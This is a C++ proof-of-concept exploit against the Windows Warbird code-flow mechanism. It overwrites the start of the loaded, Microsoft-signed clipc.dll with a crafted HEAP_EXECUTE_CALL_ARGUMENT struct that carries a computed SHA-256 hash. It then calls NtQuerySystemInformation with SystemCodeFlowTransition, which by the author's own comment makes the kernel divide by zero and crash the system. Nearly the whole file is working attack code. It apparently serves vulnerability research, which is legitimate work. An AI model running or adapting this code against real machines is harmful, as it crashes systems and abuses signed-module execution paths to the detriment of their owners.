#include <iostream>
#include <Windows.h>
#include "../warbird-example/WarbirdCUtil.inl"

// Required to compute the hash of the struct
#include "picosha2.h"

// Required to link against NtQuerySystemInformation
#pragma comment(lib, "ntdll.lib")

typedef struct _HEAP_EXECUTE_CALL_ARGUMENT {
    uint8_t ucHash[0x20];
    uint32_t ulStructSize;
    uint32_t ulZero;
    uint32_t ulParametersRva;
    uint32_t ulCheckStackSize;
    uint32_t ulChecksum : CHECKSUM_BIT_COUNT;
    uint32_t ulWrapperChecksum : CHECKSUM_BIT_COUNT;
    uint32_t ulRva : RVA_BIT_COUNT;
    uint32_t ulSize : FUNCTION_SIZE_BIT_COUNT;
    uint32_t ulWrapperRva : RVA_BIT_COUNT;
    uint32_t ulWrapperSize : FUNCTION_SIZE_BIT_COUNT;
    uint64_t ullKey;
    WarbirdRuntime::FEISTEL64_ROUND_DATA RoundData[NUMBER_FEISTEL64_ROUNDS];
} HEAP_EXECUTE_CALL_ARGUMENT, * PHEAP_EXECUTE_CALL_ARGUMENT;

typedef struct _WB_OPERATION {
    WarbirdRuntime::WbOperationType OperationType;
    union {
        // ...
        PHEAP_EXECUTE_CALL_ARGUMENT pHeapExecuteCallArgument;
        // ...
    };
    NTSTATUS* Result;
} WB_OPERATION, * PWB_OPERATION;

int main()
{
    HEAP_EXECUTE_CALL_ARGUMENT params{
    .ucHash = { }, // We'll leave this empty for now
    .ulStructSize = sizeof(HEAP_EXECUTE_CALL_ARGUMENT),
    .ulZero = 0,
    .ulParametersRva = 0,
    .ulCheckStackSize = 0,
    .ulChecksum = 0,
    .ulWrapperChecksum = 0,
    .ulRva = sizeof(HEAP_EXECUTE_CALL_ARGUMENT),
    .ulSize = 0xffc1,
    .ulWrapperRva = 0,
    .ulWrapperSize = 0,

    // The shellcode will never be execute, so it doesn't matter
    // if it decrypts to garbage bytes.
    .ullKey = 0xdeadbeefcafeaffe,
    .RoundData = { }
    };

    // Calculate the hash of the struct
    picosha2::hash256(
        reinterpret_cast<uint8_t*>(&params.ulStructSize), // Start after the hash field
        reinterpret_cast<uint8_t*>(&params + 1), // Up to the end of the struct
        reinterpret_cast<uint8_t*>(&params.ucHash), // Store the hash here
        reinterpret_cast<uint8_t*>(&params.ulStructSize) // End of the hash field
    );

    // We will place the struct and payload at the start of this library's memory
    HMODULE clipc = LoadLibraryA("clipc.dll"); // Microsoft-signed DLL
    if (clipc == NULL) return 1;

    // Change the contents of the .text section to contain the struct.
    // No need to write any encrypted shellcode, it will just take whatever
    // bytes are already there and "decrypt" them.
    DWORD old;
    VirtualProtect(clipc, sizeof(params), PAGE_READWRITE, &old);
    memcpy(clipc, &params, sizeof(params));
    VirtualProtect(clipc, sizeof(params), PAGE_EXECUTE_READ, &old);

    // Construct the Warbird request and let the kernel divide by zero ;^)
    NTSTATUS result = 0;
    WB_OPERATION request{
        .OperationType = WarbirdRuntime::WbOperationHeapExecuteCall,
        .pHeapExecuteCallArgument = (PHEAP_EXECUTE_CALL_ARGUMENT)clipc,
        .Result = &result
    };

    NTSTATUS status = NtQuerySystemInformation(SystemCodeFlowTransition, &request, sizeof(request), nullptr);
}
